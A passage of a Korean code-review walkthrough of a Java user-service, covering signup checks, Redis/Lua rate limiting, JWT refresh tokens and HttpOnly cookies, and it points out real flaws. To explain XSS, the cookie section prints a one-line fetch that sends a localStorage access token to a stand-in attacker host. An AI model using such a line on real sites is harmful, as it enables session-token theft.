# 03. user-service — 인증의 심장부, 그리고 Outbox 패턴의 출발점

> 자바 파일 115개로 이 레포에서 가장 큽니다. 회원·인증·이메일·소셜로그인·찜·마이페이지·관리자를 모두 담당합니다.
> 어려운 기술이 가장 많이 모여 있는 곳이라 이 문서가 가장 깁니다.

```
user-service/src/main/java/com/pawbridge/userservice/
├── entity/          User, Role, RefreshToken, Favorite, OutboxEvent, ProcessedEvent
├── jwt/             JwtProvider              — 토큰 발급
├── filter/          JwtAuthenticationFilter  — 로그인 처리
├── security/        PrincipalDetails(Service) — Spring Security 연결부
├── oauth2/          Google 소셜 로그인 (dto/service/handler/exception)
├── email/           이메일 인증 (Redis + Lua) — 원래 별도 서비스였다가 합쳐짐
├── service/         회원가입·인증·찜·마이페이지·Outbox
├── client/          Feign — animal-service, store-service 호출
├── consumer/        Kafka — 보상 이벤트 수신
├── handler/         보상 이벤트 실제 처리
├── scheduler/       Outbox/ProcessedEvent 정리
├── util/            CookieUtil, ResponseDTO
└── exception/       도메인 예외 30개 + common(ErrorCode, 전역 핸들러)
```

---

## 1. 회원가입 — 순서가 곧 규칙이다

[service/UserServiceImpl.java](../user-service/src/main/java/com/pawbridge/userservice/service/UserServiceImpl.java)의
`signUp()`은 검증 10단계를 번호 주석으로 달아 놓았습니다. 순서에 이유가 있습니다.

```java
// 1. 이메일 인증 확인          ← 가장 먼저. 인증 안 된 이메일은 아무것도 하지 않음
// 2. 이메일 중복 확인 (LOCAL)
// 3. 비밀번호 == 비밀번호확인
// 4. Role 필수
// 5. ROLE_ADMIN은 회원가입 불가  ← ★
// 6. ROLE_SHELTER면 careRegNo 검증 (animal-service에 물어봄)  ← 네트워크 호출
// 7. 닉네임 자동 생성
// 8. 비밀번호 암호화 (BCrypt)   ← 비싼 연산
// 9. User 생성
// 10. DB 저장
```

**왜 이 순서인가**

- **싼 검증을 먼저, 비싼 것을 나중에.** 이메일 인증 여부(Redis 조회 1번)는 싸고, `careRegNo` 검증
  (다른 서비스 HTTP 호출)과 BCrypt 해싱(의도적으로 느린 연산)은 비쌉니다. 어차피 실패할 요청에
  비싼 일을 하지 않습니다.
- **5번이 특히 중요합니다.**

```java
if (requestDto.role() == Role.ROLE_ADMIN) {
    throw new AdminRoleNotAllowedException();
}
```

회원가입 요청 본문에 `role`이 들어옵니다. 이 검증이 없으면 **누구나 `{"role": "ROLE_ADMIN"}`을 보내
관리자 계정을 만들 수 있습니다.** 클라이언트가 보낸 값으로 권한을 정하는 API에서 가장 흔한 사고이고,
여기서는 제대로 막았습니다.

> 💡 **일반화하면**: 클라이언트에서 오는 값 중 **권한·가격·소유자**에 해당하는 것은 절대 그대로 믿지 않습니다.
> 서버가 정하거나, 화이트리스트로 검증합니다.

### BCrypt — "느린 것이 장점"인 해시

```java
@Bean
public BCryptPasswordEncoder passwordEncoder() { return new BCryptPasswordEncoder(); }
```

비밀번호는 **암호화(복호화 가능)가 아니라 해시(복호화 불가)** 로 저장합니다. DB가 유출돼도 원본을
되돌릴 수 없어야 하기 때문입니다.

그런데 SHA-256 같은 일반 해시는 **너무 빠릅니다.** GPU로 초당 수십억 번 시도할 수 있어서, 흔한 비밀번호는
금방 뚫립니다. BCrypt는 두 가지로 대응합니다.

1. **의도적으로 느리게** (기본 2^10 = 1024회 반복). 로그인 1번에 수십~수백 ms를 씁니다.
   사용자는 못 느끼지만 공격자의 대량 시도 속도는 수억 배 느려집니다.
2. **자동 salt** — 같은 비밀번호도 매번 다른 해시가 나옵니다.

```
"1234" → $2a$10$N9qo8uLOickgx2ZMRZoMye...   (첫 번째)
"1234" → $2a$10$abcdefgh1234567890xyz...    (두 번째, 완전히 다름)
        └┬─┘└┬┘└──────┬──────┘
       버전  비용    salt + 해시가 함께 저장됨
```

salt가 해시 문자열 안에 함께 들어가므로 별도 컬럼이 필요 없고, `matches(평문, 해시)`가 알아서 검증합니다.
salt가 있으므로 **레인보우 테이블(미리 계산한 해시 사전)이 무력화**됩니다.

### 유니크 제약을 "예외로" 처리하는 패턴

```java
try {
    savedUser = userRepository.save(user);
} catch (DataIntegrityViolationException e) {
    log.warn("닉네임 중복 발생 (동시성), 재생성 시도");
    String newNickname = nicknameGeneratorService.generateUniqueNickname();
    ...재시도
}
```

`generateUniqueNickname()`이 이미 `existsByNickname`으로 중복을 확인했는데 왜 또 잡을까요?

**확인과 저장 사이에 틈이 있기 때문입니다** (check-then-act race condition):

```
시각  요청 A                          요청 B
 t1   "귀여운강아지" 있나? → 없음
 t2                                   "귀여운강아지" 있나? → 없음
 t3   INSERT 성공
 t4                                   INSERT → 💥 유니크 제약 위반
```

**애플리케이션 코드로는 이 틈을 없앨 수 없습니다.** 진짜 심판은 DB의 유니크 제약뿐입니다.
그래서 이 코드는 **"DB를 최후의 심판자로 두고, 위반 예외를 정상 흐름의 일부로 처리"** 합니다.
좋은 패턴입니다.

⚠️ 다만 여기엔 두 가지 문제가 남아 있습니다.

1. **재시도가 1회뿐**입니다. 두 번째도 부딪히면 500 에러가 그대로 나갑니다.
2. `DataIntegrityViolationException`은 **닉네임 중복만이 아닙니다.** `(email, provider)` 유니크 위반도
   같은 예외입니다. 그런데 catch 블록은 무조건 "닉네임 문제"로 간주해 닉네임만 바꿔 재시도하므로,
   이메일 중복이었다면 같은 예외가 또 발생하고 원인이 로그에서 오해됩니다.
   → `e.getMessage()`에서 제약 이름(`uk_...`)을 확인하거나, 애초에 재시도 루프를 유틸로 분리하는 게 낫습니다.

### 닉네임 자동 생성 — 조합 수를 계산해 둔 이유

[service/NicknameGeneratorService.java](../user-service/src/main/java/com/pawbridge/userservice/service/NicknameGeneratorService.java)

```java
ADVERBS(20) × ADJECTIVES(30) × ANIMALS(30) = 18,000 가지
// "아주귀여운강아지", "매우씩씩한펭귄" ...

public String generateUniqueNickname() {
    for (int i = 0; i < 100; i++) {           // 최대 100번 시도
        String nickname = generateRandomNickname();
        if (!userRepository.existsByNickname(nickname)) return nickname;
    }
    return generateRandomNickname() + random.nextInt(10000);  // 포기하고 숫자 붙임
}
```

`getTotalCombinations()`라는 메서드까지 만들어 둔 것은 **한계를 알고 설계했다**는 뜻입니다.
18,000명이 넘으면 충돌이 급격히 늘어나므로 숫자 접미사로 탈출구를 만들었습니다.

`SecureRandom`을 쓴 것도 눈여겨볼 점입니다. 닉네임은 보안값이 아니라 `Random`으로도 충분한데,
`SecureRandom`은 예측 불가능성이 보장됩니다. 과한 선택이지만 해로울 건 없습니다
(다만 `SecureRandom`은 느려서 초당 대량 생성 시엔 병목이 될 수 있습니다).

⚠️ **성능 관점**: 최악의 경우 DB 조회를 100번 합니다. 18,000개 중 대부분이 차면 매 회원가입이 100번
쿼리를 돌립니다. 실무에서는 "충돌하면 숫자를 붙인다"를 **처음부터** 적용하거나
(`귀여운강아지1234`), 조합 목록을 늘리는 편이 낫습니다.

---

## 2. 이메일 인증 — Redis + Lua 스크립트

원래 `email-service`라는 별도 마이크로서비스였는데 **user-service 안으로 합친** 부분입니다
(`email/` 하위 패키지). "MSA인데 왜 합쳤나"는 [7절](#7-역방향-리팩토링--email-service를-왜-합쳤나)에서 다룹니다.

### 왜 이메일 인증 정보를 Redis에 두나

인증 코드의 성질을 보면 답이 나옵니다.

| 성질 | 결론 |
|---|---|
| 5분 뒤 자동 소멸 | Redis의 **TTL**이 정확히 이 일을 한다 (DB면 스케줄러로 지워야 함) |
| 영구 보존 가치 없음 | 서버 재시작으로 사라져도 무해 (다시 받으면 됨) |
| 읽기/쓰기가 매우 빈번 | 인메모리라 빠름 |

```java
String codeKey = "email:code:" + email;
redisTemplate.opsForValue().set(codeKey, code, 5, TimeUnit.MINUTES);  // 5분 후 자동 삭제
```

**키 이름 규칙**도 잘 잡혀 있습니다. `용도:종류:식별자` 형태로 콜론을 구분자로 씁니다.

```
email:code:user@x.com            발급된 코드 (TTL 5분)
email:verified:user@x.com        인증 완료 표시 (TTL 1시간)
email:attempts:user@x.com        검증 시도 횟수
email:send:count:user@x.com      발송 횟수
password:reset:code:user@x.com   비밀번호 재설정용 (같은 구조, 접두사만 다름)
```

Redis는 폴더 구조가 없는 거대한 Map입니다. 이렇게 접두사로 계층을 표현하면 `KEYS email:code:*`로
묶어 볼 수 있고, RedisInsight 같은 도구가 트리로 보여줍니다.

**`email:verified:`의 TTL이 1시간**인 것도 의도적입니다. 이메일 인증 후 회원가입 폼을 채우다 이탈할 수
있으니 여유를 주되, 무한정 남겨 두면 몇 달 뒤에도 그 인증을 재사용할 수 있으니 1시간으로 끊었습니다.

### ★ Lua 스크립트 — "확인하고 증가"를 하나로 묶기

[email/config/RedisConfig.java](../user-service/src/main/java/com/pawbridge/userservice/email/config/RedisConfig.java)

이 프로젝트에서 가장 설명할 가치가 있는 코드입니다.

**문제**: "발송 횟수가 5회 미만이면 1 증가시킨다"를 자바로 쓰면 이렇게 됩니다.

```java
// ❌ 위험한 코드
String count = redis.get(key);                 // ① 읽기
if (count == null || toInt(count) < 5) {
    redis.incr(key);                            // ② 쓰기
    if (첫 번째) redis.expire(key, 300);        // ③ TTL
}
```

①과 ② 사이에 다른 요청이 끼어들 수 있습니다.

```
시각  요청 A            요청 B            Redis의 count
 t1   GET → 4                             4
 t2                     GET → 4           4
 t3   INCR → 5                            5
 t4                     INCR → 6          6   ← 제한이 5인데 6이 됐다
```

동시 요청 10개를 던지면 제한 5회가 무력화되고 **이메일 10통이 발송됩니다.** 이메일은 돈이 들고
(SMTP 쿼터), 스팸 신고를 받으면 도메인 평판이 떨어집니다.

**해결**: Redis에 **스크립트를 통째로** 보내고 Redis가 그것을 **하나의 연산으로** 실행하게 합니다.

```lua
local count = redis.call('GET', KEYS[1])
if count and tonumber(count) >= tonumber(ARGV[1]) then
  return -1                                    -- 초과 → 거부 신호
end
local newCount = redis.call('INCR', KEYS[1])
if newCount == 1 then
  redis.call('EXPIRE', KEYS[1], ARGV[2])       -- 첫 증가일 때만 TTL 설정
end
return newCount
```

**왜 이게 안전한가**: Redis는 **단일 스레드로 명령을 처리**합니다. Lua 스크립트는 그 하나의 명령처럼
취급되어, **실행이 끝날 때까지 다른 어떤 명령도 끼어들 수 없습니다.** ①②③이 원자적으로 묶입니다.

**호출하는 쪽**

```java
Long result = redisTemplate.execute(
        checkAndIncrementScript,
        Collections.singletonList(sendCountKey),   // KEYS[1]
        String.valueOf(MAX_SEND_ATTEMPTS),         // ARGV[1] = 5
        String.valueOf(CODE_EXPIRATION_MINUTES * 60)  // ARGV[2] = 300초
);
if (result != null && result == -1) {
    throw new TooManyAttemptsException(ErrorCode.TOO_MANY_SEND_ATTEMPTS);
}
```

**`-1`을 거부 신호로 쓴 이유** — Lua는 문자열/숫자만 반환할 수 있고 자바 예외를 던질 수 없습니다.
그래서 정상 결과(1 이상의 카운트)와 겹치지 않는 값으로 `-1`을 약속했습니다. `boolean`을 반환하려면
Lua에서 0/1을 쓰는데, 그러면 카운트를 함께 못 돌려줍니다.

**`newCount == 1`일 때만 EXPIRE하는 이유** — 매번 EXPIRE를 걸면 TTL이 계속 갱신되어
**영원히 안 만료됩니다**(sliding window). 5분마다 초기화하려면 첫 증가 시점에만 TTL을 박아야 합니다.

```
잘못된 방식 (매번 EXPIRE)        올바른 방식 (첫 번째만)
t0  INCR→1, TTL=300              INCR→1, TTL=300
t100 INCR→2, TTL=300 (리셋!)     INCR→2, TTL=200 (남은 시간 유지)
t200 INCR→3, TTL=300 (리셋!)     INCR→3, TTL=100
     → 계속 요청하면 영구 차단          → t300에 초기화됨
```

> 📌 **면접에서 자주 나오는 개념**: 이것이 **분산 환경의 Rate Limiting**입니다.
> user-service를 3대로 늘려도 Redis는 하나이므로 **3대의 요청이 합산되어** 제한이 정확히 걸립니다.
> 자바의 `synchronized`나 `AtomicInteger`로 했다면 각 서버가 따로 세어 제한이 3배로 느슨해집니다.

### 발송 순서: 이메일 먼저, Redis 나중

```java
public void sendVerificationCode(String email) {
    checkAndIncrementSendCount(email);              // 1. 횟수 제한
    String code = CodeGenerator.generateNumeric(6);  // 2. 코드 생성
    emailSenderService.sendVerificationEmail(email, code);  // 3. ★ 먼저 발송
    redisTemplate.opsForValue().set(codeKey, code, 5, MINUTES);  // 4. 성공 후 저장
    redisTemplate.delete(attemptsKey);               // 5. 시도 횟수 초기화
}
```

주석에 이유가 적혀 있습니다: *"이메일 발송 먼저 (실패하면 예외 발생, Redis 저장 안 됨)"*.

순서를 바꿔 Redis에 먼저 저장하면, 발송이 실패했을 때 **사용자는 코드를 못 받았는데 서버에는 코드가
있는 상태**가 됩니다. 사용자는 "코드가 안 와요" 하고 재발송을 누르는데 횟수 제한에 걸립니다.

⚠️ 다만 **횟수 카운트는 발송 전에 증가**하므로, 발송이 실패해도 5회 중 1회를 소모합니다.
엄밀히 하려면 발송 성공 후에 카운트를 올려야 하지만, 그러면 발송 자체를 무제한으로 시도할 수 있어
SMTP 남용을 막을 수 없습니다. **지금 순서가 보안 측면에서 더 안전한 선택입니다.**

### 검증 쪽은 원자적이지 않다 — 발송 쪽과 비교

```java
private void checkVerifyRateLimit(String email) {
    String attempts = redisTemplate.opsForValue().get(attemptsKey);   // ← 그냥 GET
    if (attempts != null && Integer.parseInt(attempts) >= 5) {
        throw new TooManyAttemptsException(...);
    }
}
```

발송 횟수는 Lua로 원자적으로 처리했는데, **검증 시도 횟수는 GET 후 비교**입니다.
증가(`incrementVerifyAttempts`)는 Lua를 쓰지만 **확인은 아닙니다.**

즉 동시에 6자리 코드를 여러 개 병렬로 던지면 5회 제한을 넘겨 시도할 수 있습니다.
6자리 = 100만 가지이고 코드 수명이 5분이라 현실적 위험은 낮지만, **발송 쪽에서 이미 올바른 해법을
갖고 있으므로 그 스크립트를 재사용하면 되는 자리**입니다.

```java
// 이렇게 통일할 수 있다
Long r = redisTemplate.execute(checkAndIncrementScript,
        List.of(attemptsKey), "5", "300");
if (r == -1) throw new TooManyAttemptsException(...);
```

### `CodeGenerator` — 6자리를 확실히 만드는 방법

```java
int bound = (int) Math.pow(10, 6);        // 1,000,000
int code = random.nextInt(bound);          // 0 ~ 999999
return String.format("%06d", code);        // 42 → "000042"
```

`String.format("%0" + length + "d", ...)`로 **앞자리를 0으로 채웁니다.**
이게 없으면 난수 42가 `"42"`(2자리)가 되어 "6자리 코드"라는 약속이 깨집니다.
`SecureRandom`을 쓴 것은 여기서는 적절합니다 — 인증 코드는 예측 불가능해야 합니다.

---

## 3. 로그인 — Spring Security 필터를 직접 갈아끼운다

[filter/JwtAuthenticationFilter.java](../user-service/src/main/java/com/pawbridge/userservice/filter/JwtAuthenticationFilter.java)

### 왜 컨트롤러가 아니라 필터인가

로그인을 `@PostMapping("/login")` 컨트롤러로 써도 됩니다. 그런데 이 프로젝트는
`UsernamePasswordAuthenticationFilter`를 **상속**했습니다.

```java
public class JwtAuthenticationFilter extends UsernamePasswordAuthenticationFilter {
    public JwtAuthenticationFilter(...) {
        setFilterProcessesUrl("/api/v1/auth/login");   // 이 URL을 가로챈다
    }
```

**이유는 Spring Security의 기존 부품을 전부 재사용하기 위해서입니다.**

```
        직접 컨트롤러로 쓰면                    필터를 상속하면
┌────────────────────────────────┐   ┌────────────────────────────────┐
│ 1. email로 User 조회 (직접)      │   │ AuthenticationManager에 위임   │
│ 2. passwordEncoder.matches()    │   │  └ PrincipalDetailsService     │
│ 3. 틀리면 예외 만들기 (직접)      │   │      .loadUserByUsername()     │
│ 4. 예외 종류별 메시지 (직접)      │   │  └ BCrypt 비교 (자동)           │
│ 5. 성공 시 토큰 발급             │   │  └ BadCredentialsException 등   │
└────────────────────────────────┘   │     표준 예외 (자동)             │
                                      │ 내가 쓸 건 성공/실패 훅 2개뿐   │
                                      └────────────────────────────────┘
```

**동작 순서**

```
POST /api/v1/auth/login  {"email": "...", "password": "..."}
   ↓
① attemptAuthentication()
     본문 JSON을 LoginRequestDto로 파싱
     → UsernamePasswordAuthenticationToken 생성
     → authenticationManager.authenticate() 호출
         ↓
       PrincipalDetailsService.loadUserByUsername(email)
         → DB에서 User 조회 → PrincipalDetails로 감싸 반환
         ↓
       Spring Security가 BCrypt로 비밀번호 비교
         ↓
② 성공 → successfulAuthentication()
     Access Token 생성 → Refresh Token 생성 → DB 저장 → 쿠키 2개 설정 → JSON 응답
   실패 → unsuccessfulAuthentication()
     예외 종류별 한국어 메시지로 401 응답
```

`PrincipalDetails`가 `UserDetails`와 `OAuth2User`를 **동시에 구현**한 것도 영리합니다.
일반 로그인과 소셜 로그인이 같은 타입을 쓰므로 후속 코드(`OAuth2SuccessHandler`, `successfulAuthentication`)가
`((PrincipalDetails) principal).getUser()`로 통일됩니다.

```java
public class PrincipalDetails implements UserDetails, OAuth2User {
    private final User user;
    private Map<String, Object> attributes;   // OAuth2일 때만 채워짐

    public PrincipalDetails(User user) { ... }                          // 일반 로그인
    public PrincipalDetails(User user, Map<String,Object> attrs) { ... } // 소셜 로그인
}
```

`getAuthorities()`가 `List.of(new SimpleGrantedAuthority(user.getRole().name()))`인데,
`Role` enum 값이 애초에 `ROLE_USER`, `ROLE_ADMIN`, `ROLE_SHELTER`로 **`ROLE_` 접두사를 포함**합니다.
Spring Security의 `hasRole("USER")`는 내부적으로 `ROLE_USER`를 찾으므로, enum에 접두사를 넣어두면
변환 코드가 필요 없습니다. 사소하지만 실수가 잦은 지점을 피했습니다.

### 실패 메시지를 한국어로 바꿔주는 부분

```java
private String getAuthenticationErrorMessage(AuthenticationException exception) {
    if (exception instanceof BadCredentialsException)      return "이메일 또는 비밀번호가 일치하지 않습니다.";
    else if (exception instanceof UsernameNotFoundException) return "존재하지 않는 사용자입니다.";
    else                                                    return "인증에 실패했습니다.";
}
```

⚠️ **보안 관점의 지적**: "존재하지 않는 사용자입니다"와 "비밀번호가 일치하지 않습니다"를 **구분해서
알려주면 안 됩니다.** 공격자가 이메일 목록을 넣어보며 **어느 이메일이 가입돼 있는지 알아낼 수 있습니다**
(user enumeration). 가입 여부는 그 자체로 개인정보입니다.

재밌는 건 **같은 프로젝트의 비밀번호 재설정에서는 이걸 정확히 지켰다**는 점입니다:

```java
// AuthServiceImpl.requestPasswordReset()
if (userOpt.isPresent()) { ...발송... }
// 이메일이 없어도 동일하게 성공 응답 (보안)
```

로그인 쪽도 둘 다 `"이메일 또는 비밀번호가 일치하지 않습니다."`로 통일하는 게 맞습니다.

---

## 4. JWT — Access / Refresh 두 토큰 전략

[jwt/JwtProvider.java](../user-service/src/main/java/com/pawbridge/userservice/jwt/JwtProvider.java)

### Access Token: 정보를 담고, 짧게 산다

```java
public String createAccessToken(User user) {
    var builder = Jwts.builder()
            .subject(user.getEmail())
            .claim("userId", user.getUserId())
            .claim("name", user.getName())
            .claim("role", user.getRole().name());
    if (user.getCareRegNo() != null && !user.getCareRegNo().isBlank()) {
        builder.claim("careRegNo", user.getCareRegNo());   // 보호소 회원만
    }
    return builder.issuedAt(now).expiration(expiration).signWith(secretKey).compact();
}
```

**핵심은 "서버에 저장하지 않는다"** 입니다. 토큰 안에 userId·role이 들어 있고 서명으로 위조를 막으므로,
게이트웨이는 **DB를 한 번도 조회하지 않고** 사용자를 식별합니다. 이게 stateless 인증의 이점입니다.

```
JWT 구조:  헤더.페이로드.서명
{alg:HS256}.{sub:"a@b.com", userId:1, role:"ROLE_USER", exp:...}.HMAC(헤더+페이로드, 비밀키)
             └── Base64라서 누구나 읽을 수 있다! ──┘  └ 비밀키 없이는 못 만든다 ┘
```

> ⚠️ **자주 하는 오해**: JWT는 **암호화가 아니라 서명**입니다. 페이로드는 Base64일 뿐이라 누구나
> 디코딩해서 읽습니다(jwt.io에 붙여보면 보입니다). 그래서 **비밀번호나 민감정보를 담으면 안 됩니다.**
> 여기 담긴 email·name·role은 본인 정보이므로 괜찮습니다.

**대가는 "취소할 수 없다"** 입니다. 발급된 토큰은 만료 전까지 유효하고, 서버가 무효화할 방법이 없습니다.
관리자가 회원을 강제 탈퇴시켜도 그 사람의 토큰은 만료까지 계속 통과합니다.
그래서 수명을 **15분**으로 짧게 잡았습니다(`access-token-expiration: 900000`).

**`careRegNo`를 조건부로 넣은 이유**는 실용적입니다. 보호소 회원만 이 값이 있으므로 일반 회원 토큰에는
넣지 않아 토큰 크기를 줄입니다. 쿠키/헤더로 매 요청 실려 나가는 값이라 크기가 곧 트래픽입니다.

### Refresh Token: 정보가 없고, DB에 저장한다

```java
public String createRefreshToken() {          // ← 파라미터가 없다!
    return Jwts.builder()
            .issuedAt(now)
            .expiration(expiration)
            .signWith(secretKey)
            .compact();
}
```

**사용자 정보를 아무것도 담지 않습니다.** 대신 DB의 `refresh_tokens` 테이블에서 찾습니다.

```java
// AuthServiceImpl.refreshToken()
RefreshToken refreshToken = refreshTokenRepository.findByToken(refreshTokenValue)   // 토큰 → 행
        .orElseThrow(RefreshTokenNotFoundException::new);
User user = userRepository.findById(refreshToken.getUserId())                        // 행 → 사용자
        .orElseThrow(UserNotFoundException::new);
```

**왜 Access는 저장 안 하고 Refresh는 저장하나** — 이 질문이 핵심입니다.

| | Access Token | Refresh Token |
|---|---|---|
| 사용 빈도 | **모든 요청** | 15분에 1번 |
| DB 조회 비용 | 매 요청 조회는 부담 | 15분에 1번은 부담 없음 |
| 수명 | 15분 | 7일 |
| 탈취 시 피해 | 15분 후 무용 | 7일간 계속 재발급 가능 → **커야 함** |
| 무효화 필요성 | 짧으니 방치 가능 | **로그아웃 시 즉시 끊어야 함** |

정리하면 **"자주 쓰는 건 검증을 싸게(stateless), 위험한 건 통제 가능하게(stateful)"** 입니다.
로그아웃은 `refreshTokenRepository.deleteByUserId(userId)` 한 줄로 끝납니다.
DB에 없는 refresh 토큰은 재발급이 거부되므로, 남은 Access Token 15분만 버티면 완전히 차단됩니다.

### Refresh Token Rotation(회전)

```java
// 재발급할 때 Refresh Token도 새로 발급하고 DB를 갱신한다
String newRefreshToken = jwtProvider.createRefreshToken();
refreshToken.updateToken(newRefreshToken, newExpiresAt);
```

한 번 쓴 refresh 토큰은 즉시 무효가 됩니다. 탈취된 토큰이 있어도 정상 사용자가 먼저 재발급하면
공격자의 토큰은 못 쓰게 됩니다. **rotation을 구현한 것은 잘한 부분입니다.**

### 🚨 여기에 심각한 결함이 있습니다 — 같은 초에 로그인하면 토큰이 겹칩니다

`createRefreshToken()`을 다시 보세요.

```java
public String createRefreshToken() {
    Date now = new Date();
    Date expiration = new Date(now.getTime() + refreshTokenExpiration);
    return Jwts.builder()
            .issuedAt(now)          // ← JWT의 iat/exp는 "초" 단위 (밀리초 아님)
            .expiration(expiration)
            .signWith(secretKey)
            .compact();
}
```

**토큰을 구성하는 값이 `iat`와 `exp`뿐이고, JWT 표준은 이 값을 초 단위 정수로 저장합니다.**
사용자 식별자도, 난수도 없습니다. 따라서:

> **같은 1초 안에 로그인한 두 사용자는 완전히 동일한 refresh 토큰 문자열을 받습니다.**

무슨 일이 벌어지나:

```
RefreshToken 엔티티:
    @Column(nullable = false, unique = true, length = 500)
    private String token;                       // ← 유니크 제약

A 사용자 로그인 (12:00:00.100) → 토큰 "eyJ...XYZ" 저장 성공
B 사용자 로그인 (12:00:00.700) → 토큰 "eyJ...XYZ" (동일!) 저장 → 💥 유니크 위반
```

- **B의 로그인이 500 에러로 실패합니다.** 원인 파악이 매우 어려운 종류의 버그입니다.
- 만약 유니크 제약이 없었다면 더 나쁩니다. `findByToken()`이 A의 행을 찾을 수도 있으므로
  **B가 재발급을 요청하면 A의 Access Token을 받습니다 — 계정 탈취입니다.**
- 사용자가 늘어날수록 확률이 올라갑니다. 초당 로그인이 2건이면 흔하게 터집니다.

**고치는 방법 — 한 줄입니다.**

```java
public String createRefreshToken() {
    return Jwts.builder()
            .id(UUID.randomUUID().toString())   // ★ jti(JWT ID) 클레임 추가
            .issuedAt(now)
            .expiration(expiration)
            .signWith(secretKey)
            .compact();
}
```

`jti`는 JWT 표준에 있는 "토큰 고유 ID" 클레임입니다. UUID를 넣으면 충돌이 사실상 사라집니다.

**더 나은 설계**: refresh 토큰은 애초에 JWT일 필요가 없습니다. 정보를 담지 않고 DB를 조회하는 구조이므로
**그냥 `UUID.randomUUID().toString()`(불투명 토큰)이면 충분**합니다. JWT로 만들면 서명 검증 비용만
추가되고 얻는 게 없습니다. 실제로 `validateRefreshToken()`은 만료 검사에만 쓰이는데, 만료는 DB의
`expiresAt`으로 이미 확인하고 있어 중복입니다.

### 한 사용자에 refresh 토큰 1개 — 다중 기기의 문제

```java
refreshTokenRepository.findByUserId(user.getUserId())
        .ifPresentOrElse(
            existingToken -> { existingToken.updateToken(refreshToken, expiresAt); ... },  // 덮어쓰기
            () -> { ...새로 생성... }
        );
```

`userId`당 한 행만 유지합니다. 그래서 **PC에서 로그인하면 휴대폰이 로그아웃됩니다**(7일 안에 재발급을
시도하는 순간 실패). 의도한 정책이라면 문제없지만, 대부분의 서비스는 기기별 로그인을 허용합니다.

기기별로 허용하려면 `refresh_tokens`를 `userId`당 여러 행으로 두고 기기 식별자를 함께 저장합니다.
그러면 "다른 기기 모두 로그아웃" 같은 기능도 만들 수 있습니다.

---

## 5. 쿠키 전략 — localStorage에서 옮겨온 이유

[util/CookieUtil.java](../user-service/src/main/java/com/pawbridge/userservice/util/CookieUtil.java)

이 레포의 최신 커밋(`b9093d9`)이 바로 이 변경입니다: *"토큰 저장 방식 => 로컬스토리지 저장하는 방법 대신
쿠키로 전달하는 방법으로"*.

### localStorage의 문제

```javascript
// 이전 방식
localStorage.setItem('accessToken', res.data.accessToken);
```

localStorage는 **자바스크립트가 자유롭게 읽을 수 있습니다.** 그래서 XSS(스크립트 삽입) 취약점이 하나라도
있으면 토큰이 그대로 털립니다.

```javascript
// 공격자가 심은 스크립트 한 줄
fetch('https://공격자.com?t=' + localStorage.getItem('accessToken'));
```

댓글, 게시글, 닉네임 — 사용자 입력을 화면에 그리는 곳이 하나라도 이스케이프를 놓치면 발생합니다.
**커뮤니티 기능이 있는 이 서비스에서는 특히 현실적인 위험입니다.**

### HttpOnly 쿠키의 해법

```java
cookieBuilder.append(name).append("=").append(value);
cookieBuilder.append("; Path=/");
cookieBuilder.append("; Max-Age=").append(maxAge);
cookieBuilder.append("; HttpOnly");              // ★ JS가 읽을 수 없다
if (isProduction) {
    cookieBuilder.append("; Domain=.pawbridge.kr");
    cookieBuilder.append("; SameSite=None");
    cookieBuilder.append("; Secure");
}
response.addHeader("Set-Cookie", cookieBuilder.toString());
```

| 속성 | 역할 | 막는 공격 |
|---|---|---|
| **HttpOnly** | JS(`document.cookie`)에서 접근 불가. 브라우저가 요청에 자동 첨부만 함 | **XSS 토큰 탈취** |
| **Secure** | HTTPS에서만 전송 | 중간자 도청 |
| **SameSite** | 다른 사이트에서 온 요청에 쿠키를 붙일지 결정 | **CSRF** |
| **Domain** | 어느 도메인에 쿠키를 보낼지 | — (서브도메인 공유 목적) |
| **Path=/** | 모든 경로에 전송 | — |

XSS가 있어도 토큰을 **읽을 수** 없습니다. (다만 공격자가 사용자 브라우저에서 API를 대신 호출하는
것은 여전히 가능합니다 — HttpOnly는 "탈취"를 막고 "악용"을 다 막지는 못합니다.)

### `SameSite` 이해하기

```
SameSite=Strict   다른 사이트에서 온 요청에는 절대 안 붙임 (가장 안전, 불편)
SameSite=Lax      링크 클릭 같은 안전한 이동에는 붙임 (기본값)
SameSite=None     항상 붙임 → 반드시 Secure 필요
```

`Domain=.pawbridge.kr`을 주면 `www.pawbridge.kr`과 `api.pawbridge.kr`이 쿠키를 공유합니다.
앞의 점(`.`)이 "이 도메인과 그 아래 모든 서브도메인"을 뜻합니다.

### ⚠️ 문제: `prod` 분기가 실제로는 실행되지 않습니다

```java
boolean isProduction = "prod".equals(activeProfile);
```

`activeProfile`은 `${spring.profiles.active:local}`인데, 배포 환경은
[docker-compose-node-4.yml](../deployment/docker-compose-node-4.yml)에서
**`SPRING_PROFILES_ACTIVE=dev`** 로 뜹니다. `"prod"`가 아닙니다.

**결과: 실제 운영 트래픽에서 `Secure`, `SameSite=None`, `Domain`이 전부 빠집니다.**

- `www.pawbridge.kr` → `api.pawbridge.kr`은 등록가능도메인(`pawbridge.kr`)이 같아 **same-site**이므로,
  기본값 `Lax`로도 쿠키는 전송됩니다. **로그인이 깨지지는 않습니다.**
- 하지만 `Secure`가 없어서 **HTTP로도 쿠키가 전송될 수 있습니다.** nginx가 80→443 리다이렉트를 하지만,
  리다이렉트되기 전의 첫 평문 요청에 쿠키가 실려 나갑니다.

**고치는 방법**: 프로필 문자열을 비교하는 대신 설정값으로 뽑아냅니다.

```java
@Value("${app.cookie.secure:false}")  private boolean secure;
@Value("${app.cookie.domain:}")       private String domain;
```

이렇게 하면 config repo의 `-dev.yml`에서 `app.cookie.secure: true`로 켤 수 있고,
"prod라는 이름의 프로필을 만들어야만 보안이 켜지는" 함정이 사라집니다.

### ⚠️ 또 하나: 쿠키 수명과 토큰 수명이 다릅니다

```java
private static final int ACCESS_TOKEN_MAX_AGE = 30 * 60;   // 쿠키: 30분
```
```yaml
jwt:
  access-token-expiration: 900000                          # 토큰: 15분
```

15분이 지나면 토큰은 만료됐는데 쿠키는 15분 더 남아 있습니다. 그 구간에서는 게이트웨이가 계속 401을
반환하고, 프론트엔드가 401을 받아 `/auth/refresh`를 호출하는 흐름에 의존합니다.
정상 동작하도록 만들 수는 있지만, **두 숫자가 한 곳에서 나오도록** 묶는 편이 안전합니다
(`ACCESS_TOKEN_MAX_AGE`를 `jwt.access-token-expiration`에서 계산).

---

## 6. Google 소셜 로그인

`oauth2/` 패키지가 담당합니다.

### 전체 흐름

```
① 사용자가 "구글로 로그인" 클릭
     → GET /oauth2/authorization/google  (게이트웨이가 user-service로 라우팅, JWT 필터 없음)
② Spring Security가 구글 동의 화면으로 리다이렉트
